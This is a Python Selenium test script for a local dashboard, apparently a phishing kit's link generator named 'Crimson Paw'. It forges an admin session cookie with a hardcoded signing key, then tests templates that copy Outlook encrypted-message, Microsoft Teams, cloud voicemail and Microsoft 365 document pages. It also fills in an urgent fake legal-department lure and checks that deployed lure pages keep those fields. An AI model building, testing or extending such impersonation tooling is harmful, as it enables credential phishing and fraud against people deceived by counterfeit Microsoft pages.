import sys
sys.stdout.reconfigure(encoding='utf-8')
import time
import os
import json
import urllib.request
from itsdangerous import URLSafeTimedSerializer
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.options import Options as ChromeOptions

signer = URLSafeTimedSerializer('crimson_paw_obsidian_ruby_key_2026', salt='cookie-session', signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'})
session_val = signer.dumps({'authenticated': True, 'role': 'admin', 'username': 'admin'})

options = ChromeOptions()
options.add_argument('--headless=new')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--window-size=1600,1050')

driver = webdriver.Chrome(options=options)

try:
    print("[1] Opening Crimson Paw login to set cookie...")
    driver.get('http://127.0.0.1:5000/login')
    time.sleep(1)

    driver.add_cookie({
        'name': 'session',
        'value': session_val,
        'path': '/',
        'httpOnly': True
    })

    print("[2] Navigating to Dashboard & Link Generator...")
    driver.get('http://127.0.0.1:5000/dashboard')
    time.sleep(1.5)

    driver.execute_script("showPage('templates')")
    time.sleep(1.5)

    # Expand preland accordion
    driver.execute_script("document.getElementById('lg-preland-body').classList.remove('collapsed'); document.getElementById('lg-preland-body').style.display = 'block';")
    time.sleep(0.5)

    # 1. Test Template Dropdown Switching
    tpl_select = Select(driver.find_element(By.ID, 'lg-template-select'))

    def check_visibility(group_id):
        el = driver.find_element(By.ID, group_id)
        disp = driver.execute_script("return window.getComputedStyle(arguments[0]).display;", el)
        return disp != 'none'

    def get_status_tag():
        return driver.find_element(By.ID, 'lg-status-tag').get_attribute('value')

    print("\n[3] Testing Template: Outlook...")
    tpl_select.select_by_value('Outlook')
    time.sleep(0.8)

    assert check_visibility('preland-group-outlook') == True, "Outlook group should be visible"
    assert check_visibility('preland-group-document') == False, "Document group should be hidden"
    assert check_visibility('preland-group-teams') == False, "Teams group should be hidden"
    assert check_visibility('preland-group-voicemail') == False, "Voicemail group should be hidden"
    tag_val = get_status_tag()
    print(f"  Status tag for Outlook: '{tag_val}'")
    assert "Outlook" in tag_val, f"Expected Outlook in status tag, got: {tag_val}"

    # Check Outlook inputs have values
    sender = driver.find_element(By.ID, 'lg-outlook-sender').get_attribute('value')
    subject = driver.find_element(By.ID, 'lg-outlook-subject').get_attribute('value')
    meta = driver.find_element(By.ID, 'lg-outlook-meta').get_attribute('value')
    print(f"  Outlook Sender: {sender}")
    print(f"  Outlook Subject: {subject}")
    print(f"  Outlook Meta: {meta}")
    assert len(sender) > 0 and len(subject) > 0 and len(meta) > 0

    print("\n[4] Testing Template: Microsoft Teams...")
    tpl_select.select_by_value('Microsoft Teams')
    time.sleep(0.8)

    assert check_visibility('preland-group-teams') == True, "Teams group should be visible"
    assert check_visibility('preland-group-document') == False, "Document group should be hidden"
    assert check_visibility('preland-group-outlook') == False, "Outlook group should be hidden"
    assert check_visibility('preland-group-voicemail') == False, "Voicemail group should be hidden"
    tag_val = get_status_tag()
    print(f"  Status tag for Teams: '{tag_val}'")
    assert "Lobby" in tag_val, f"Expected Lobby in status tag, got: {tag_val}"

    topic = driver.find_element(By.ID, 'lg-teams-topic').get_attribute('value')
    organizer = driver.find_element(By.ID, 'lg-teams-organizer').get_attribute('value')
    print(f"  Teams Topic: {topic}")
    print(f"  Teams Organizer: {organizer}")
    assert len(topic) > 0 and len(organizer) > 0

    print("\n[5] Testing Template: Cloud Voicemail...")
    tpl_select.select_by_value('Cloud Voicemail')
    time.sleep(0.8)

    assert check_visibility('preland-group-voicemail') == True, "Voicemail group should be visible"
    assert check_visibility('preland-group-document') == False, "Document group should be hidden"
    assert check_visibility('preland-group-outlook') == False, "Outlook group should be hidden"
    assert check_visibility('preland-group-teams') == False, "Teams group should be hidden"
    tag_val = get_status_tag()
    print(f"  Status tag for Voicemail: '{tag_val}'")
    assert "Voicemail" in tag_val, f"Expected Voicemail in status tag, got: {tag_val}"

    caller = driver.find_element(By.ID, 'lg-vm-caller').get_attribute('value')
    vm_time = driver.find_element(By.ID, 'lg-vm-time').get_attribute('value')
    vm_dur = driver.find_element(By.ID, 'lg-vm-duration').get_attribute('value')
    print(f"  Voicemail Caller: {caller}")
    print(f"  Voicemail Time: {vm_time}")
    print(f"  Voicemail Duration: {vm_dur}")
    assert len(caller) > 0 and len(vm_dur) > 0

    print("\n[6] Testing Template: Microsoft 365 (Document)...")
    tpl_select.select_by_value('Microsoft 365')
    time.sleep(0.8)

    assert check_visibility('preland-group-document') == True, "Document group should be visible"
    assert check_visibility('preland-group-teams') == False, "Teams group should be hidden"
    assert check_visibility('preland-group-outlook') == False, "Outlook group should be hidden"
    assert check_visibility('preland-group-voicemail') == False, "Voicemail group should be hidden"
    tag_val = get_status_tag()
    print(f"  Status tag for M365: '{tag_val}'")
    assert "Microsoft 365" in tag_val

    doc_name = driver.find_element(By.ID, 'lg-doc-name').get_attribute('value')
    doc_badge = driver.find_element(By.ID, 'lg-doc-badge').get_attribute('value')
    print(f"  Doc Name: {doc_name}")
    print(f"  Doc Badge: {doc_badge}")
    assert len(doc_name) > 0 and len(doc_badge) > 0

    print("\n[7] Testing Mode R Steps Toggle Button...")
    driver.execute_script("""
        document.getElementById('lg-landing-body').classList.remove('collapsed');
        document.getElementById('lg-landing-body').style.display = 'block';
        document.getElementById('lg-success-body').classList.remove('collapsed');
        document.getElementById('lg-success-body').style.display = 'block';
        setLandingMode('R');
    """)
    time.sleep(0.5)
    r_section = driver.find_element(By.ID, 'mode-section-R')
    assert driver.execute_script("return window.getComputedStyle(arguments[0]).display;", r_section) != 'none'

    steps_btn = driver.find_element(By.ID, 'lg-show-land-r-steps')
    print(f"  Initial Mode R steps button text: '{steps_btn.text.strip()}'")
    assert "Hide" in steps_btn.text or "Show" in steps_btn.text

    steps_btn.click()
    time.sleep(0.3)
    print(f"  After toggle button text: '{steps_btn.text.strip()}'")

    print("\n[8] Testing Background Image Controls across Editors...")
    preland_bg_btn = driver.find_element(By.ID, 'lg-bg-image-show')
    print(f"  Pre-land BG button: '{preland_bg_btn.text.strip()}'")
    assert "Hide" in preland_bg_btn.text or "Show" in preland_bg_btn.text

    land_bg_btn = driver.find_element(By.ID, 'lg-land-bg-image-show')
    print(f"  Landing BG button: '{land_bg_btn.text.strip()}'")
    assert "Hide" in land_bg_btn.text or "Show" in land_bg_btn.text

    succ_bg_btn = driver.find_element(By.ID, 'lg-succ-bg-show')
    print(f"  Success BG button: '{succ_bg_btn.text.strip()}'")
    assert "Hide" in succ_bg_btn.text or "Show" in succ_bg_btn.text

    print("\n[9] Testing Realtime Pre-Landing Previews...")
    # Preview Outlook
    tpl_select.select_by_value('Outlook')
    time.sleep(1)
    driver.find_element(By.ID, 'btn-prev-preland').click()
    time.sleep(1.2)
    iframe = driver.find_element(By.ID, 'lg-preview-iframe')
    srcdoc = iframe.get_attribute('srcdoc') or ''
    print(f"  Outlook preview srcdoc length: {len(srcdoc)}")
    assert "Encrypted Message" in srcdoc or "message-box" in srcdoc, "Outlook preview should render authentic OME layout"
    driver.save_screenshot("scratch/preview_outlook.png")
    print("  Screenshot saved: scratch/preview_outlook.png")

    # Preview Teams
    tpl_select.select_by_value('Microsoft Teams')
    time.sleep(1)
    srcdoc = iframe.get_attribute('srcdoc') or ''
    print(f"  Teams preview srcdoc length: {len(srcdoc)}")
    assert "Microsoft Teams" in srcdoc or "teams-dots" in srcdoc or "organizer-row" in srcdoc
    driver.save_screenshot("scratch/preview_teams.png")
    print("  Screenshot saved: scratch/preview_teams.png")

    # Preview Voicemail
    tpl_select.select_by_value('Cloud Voicemail')
    time.sleep(1)
    srcdoc = iframe.get_attribute('srcdoc') or ''
    print(f"  Voicemail preview srcdoc length: {len(srcdoc)}")
    assert "Voicemail" in srcdoc or "audio-player-box" in srcdoc or "waveform-bars" in srcdoc
    driver.save_screenshot("scratch/preview_voicemail.png")
    print("  Screenshot saved: scratch/preview_voicemail.png")

    print("\n[10] Testing Deployment and Customization Persistence...")
    tpl_select.select_by_value('Outlook')
    time.sleep(0.5)

    custom_sender = "Legal Dept <counsel-notice@corp-compliance.internal>"
    custom_subject = "CONFIDENTIAL: Urgently required arbitration response"
    sender_input = driver.find_element(By.ID, 'lg-outlook-sender')
    sender_input.clear()
    sender_input.send_keys(custom_sender)

    subj_input = driver.find_element(By.ID, 'lg-outlook-subject')
    subj_input.clear()
    subj_input.send_keys(custom_subject)

    print("  Clicking Generate Deployment...")
    res = driver.execute_async_script("""
        const done = arguments[0];
        try {
            deployLink()
                .then(r => done({success: true, val: r}))
                .catch(err => done({success: false, error: err ? (err.message || String(err)) : 'unknown'}));
        } catch(e) {
            done({success: false, error: e.message});
        }
    """)
    print(f"  deployLink promise returned: {res}")
    time.sleep(1)

    print("  Browser logs after deployLink:")
    for entry in driver.get_log('browser'):
        print(f"    [{entry['level']}] {entry['message']}")

    dep_list = driver.execute_async_script("const done = arguments[0]; fetch('/api/lg/deployments').then(r => r.json()).then(done);")
    print(f"  Deployments in memory/table: {len(dep_list)}")
    assert len(dep_list) > 0, "Should have at least 1 deployment"

    latest_dep = dep_list[0]
    dep_path = latest_dep.get('path')
    print(f"  Latest deployment ID: {latest_dep.get('id')}, Template: {latest_dep.get('template_name')}, Path: {dep_path}")

    # Verify deployed HTML
    dep_url = f"http://127.0.0.1:5000/{dep_path}"
    req = urllib.request.Request(dep_url, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req) as resp:
        deployed_html = resp.read().decode('utf-8')

    print(f"  Deployed HTML length: {len(deployed_html)}")
    assert custom_subject in deployed_html, "Custom subject MUST be present in deployed HTML!"
    assert custom_sender in deployed_html, "Custom sender MUST be present in deployed HTML!"
    print("  -> Deployed HTML successfully retained custom user fields!")

    print("\n[11] Testing Bulk Delete Deployment Table...")
    # Create another deployment
    driver.execute_async_script("const done = arguments[0]; deployLink().then(done).catch(err => done({error: err.message}));")
    time.sleep(1)
    dep_list = driver.execute_async_script("const done = arguments[0]; fetch('/api/lg/deployments').then(r => r.json()).then(done);")
    initial_count = len(dep_list)
    print(f"  Deployments count before bulk delete: {initial_count}")

    # Reload table to ensure DOM has updated rows
    driver.execute_script("loadDeploymentsTable();")
    time.sleep(1)

    checkboxes = driver.find_elements(By.CSS_SELECTOR, '.lg-row-chk')
    print(f"  Found {len(checkboxes)} deployment row checkboxes")
    assert len(checkboxes) >= 2

    # Check the first 2 checkboxes
    driver.execute_script("arguments[0].checked = true; arguments[1].checked = true;", checkboxes[0], checkboxes[1])
    time.sleep(0.5)

    # Click delete selected deployments
    driver.execute_script("deleteSelectedDeployments();")
    time.sleep(1)

    # Confirm in modal
    confirm_btn = driver.find_element(By.ID, 'appConfirmBtn')
    confirm_btn.click()
    time.sleep(2.5)

    dep_list_after = driver.execute_async_script("const done = arguments[0]; fetch('/api/lg/deployments').then(r => r.json()).then(done);")
    print(f"  Deployments count after bulk delete: {len(dep_list_after)}")
    assert len(dep_list_after) == initial_count - 2, f"Expected {initial_count - 2}, got {len(dep_list_after)}"
    print("  -> Bulk delete successfully deleted selected deployments!")

    print("\n==========================================")
    print("ALL TESTS PASSED WITH 100% SUCCESS!")
    print("==========================================")

finally:
    driver.quit()
